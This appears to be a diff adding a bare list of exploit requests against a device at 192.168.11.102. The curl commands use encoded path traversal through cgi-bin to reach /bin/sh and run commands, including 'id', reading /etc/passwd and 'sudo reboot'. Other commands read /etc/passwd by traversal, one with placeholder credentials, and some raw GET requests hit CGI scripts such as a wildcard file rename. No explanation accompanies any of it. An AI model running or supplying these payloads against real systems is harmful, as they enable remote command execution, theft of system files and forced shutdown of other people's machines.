@@ -1,0 +1,18 @@
+curl -X POST "http://192.168.11.102/cgi-bin/.%2e/%2e%2e/%2e%2e/bin/sh" -H "Content-Type: application/x-www-form-urlencoded" --data "echo Content-Type: text/plain; echo; id"
+
+curl -X POST "http://192.168.11.102/cgi-bin/.%2e/%2e%2e/%2e%2e/bin/sh" -H "Content-Type: application/x-www-form-urlencoded" --data "echo Content-Type: text/plain; echo; cat ../../../etc/passwd"
+
+GET /cgi-bin/rename.cgi?old=*.jpg&new=A.jpg HTTP/1.1
+Host: 192.168.11.102
+
+GET /cgi-bin/ip.cgi HTTP/1.1
+Host: 192.168.11.102
+
+curl -u user:password --silent --path-as-is --insecure "http://192.168.11.102/icon/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
+
+GET / HTTP/1.1
+Host: 192.168.11.102
+
+curl --silent --path-as-is --insecure "http://192.168.11.102/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
+
+curl -X POST "http://192.168.11.102/cgi-bin/.%2e/%2e%2e/%2e%2e/bin/sh" -H "Content-Type: application/x-www-form-urlencoded" --data "echo Content-Type: text/plain; echo;sudo reboot"
